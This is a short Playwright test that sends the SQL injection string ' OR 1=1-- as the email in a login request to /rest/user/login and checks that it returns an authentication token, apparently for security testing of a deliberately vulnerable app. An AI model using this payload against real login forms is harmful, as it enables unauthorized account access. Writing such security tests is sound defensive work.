import { test, expect } from '@playwright/test';

test('SQL Injection - Login', async ({ request }) => {
  const response = await request.post('/rest/user/login', {
    data: {
      email: "' OR 1=1--",
      password: 'anything',
    },
  });

  const body = await response.json();

  expect(response.status()).toBe(200);
  expect(body.authentication).toBeDefined();
  expect(body.authentication.token).toBeTruthy();
});